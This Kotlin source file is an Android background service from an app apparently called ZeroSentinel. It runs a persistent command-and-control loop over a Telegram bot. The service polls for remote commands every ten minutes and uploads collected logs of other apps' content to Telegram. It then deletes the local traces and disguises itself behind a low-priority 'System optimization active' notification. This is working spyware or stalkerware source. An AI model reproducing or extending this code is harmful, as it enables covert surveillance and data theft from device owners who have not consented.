package com.zero.sentinel.services

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.zero.sentinel.R
import com.zero.sentinel.ZeroSentinelApp
import com.zero.sentinel.data.repository.LogRepository
import com.zero.sentinel.network.CommandProcessor
import com.zero.sentinel.network.TelegramClient
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.io.File
import java.io.FileWriter

class SentinelService : Service() {

    private val scope = CoroutineScope(Dispatchers.IO)
    private lateinit var telegramClient: TelegramClient
    private lateinit var commandProcessor: CommandProcessor
    private lateinit var repository: LogRepository
    private var lastUpdateId = 0L

    override fun onCreate() {
        super.onCreate()
        val app = applicationContext as ZeroSentinelApp
        repository = app.repository
        telegramClient = TelegramClient(this)
        commandProcessor = CommandProcessor(repository, telegramClient)
    }

    override fun onBind(intent: Intent): IBinder? {
        return null // We don't bind, we stick.
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForegroundService()
        startC2Loop()
        return START_STICKY
    }

    private fun startC2Loop() {
        scope.launch {
            while (true) {
                try {
                    Log.d("SentinelC2", "Starting C2 Cycle")
                    
                    // 1. Poll for Commands
                    val updates = telegramClient.pollUpdates(lastUpdateId + 1)
                    val newId = commandProcessor.processUpdates(updates)
                    if (newId > lastUpdateId) lastUpdateId = newId
                    
                    // 2. Upload Logs
                    uploadLogs()
                    
                } catch (e: Exception) {
                    Log.e("SentinelC2", "Error in C2 loop", e)
                }

                // Wait 10 minutes
                delay(10 * 60 * 1000) 
            }
        }
    }

    private suspend fun uploadLogs() {
        val logs = repository.getAllLogs()
        if (logs.isEmpty()) return

        val file = File(cacheDir, "logs_${System.currentTimeMillis()}.txt")
        try {
            val writer = FileWriter(file)
            logs.forEach { log ->
                writer.append("[${java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(java.util.Date(log.timestamp))}] ")
                writer.append("${log.type} (${log.packageName}): ${log.content}\n")
            }
            writer.flush()
            writer.close()

            telegramClient.sendDocument(file)
            
            // Allow time for upload (simplified for now, ideally verified by response)
            repository.deleteAllLogs()
            file.delete()
            
            Log.i("SentinelC2", "Uploaded ${logs.size} logs")
        } catch (e: Exception) {
            Log.e("SentinelC2", "Failed to export/upload logs", e)
        }
    }

    private fun startForegroundService() {
        val channelId = "system_core_channel"
        val channelName = "System Core"

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId,
                channelName,
                NotificationManager.IMPORTANCE_MIN
            )
            channel.description = "Core system services"
            val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            manager.createNotificationChannel(channel)
        }

        val notification: Notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("System Service")
            .setContentText("System optimization active")
            .setSmallIcon(R.drawable.ic_sim_menu) 
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .build()
        
        // ID must not be 0
        startForeground(999, notification)
    }
}
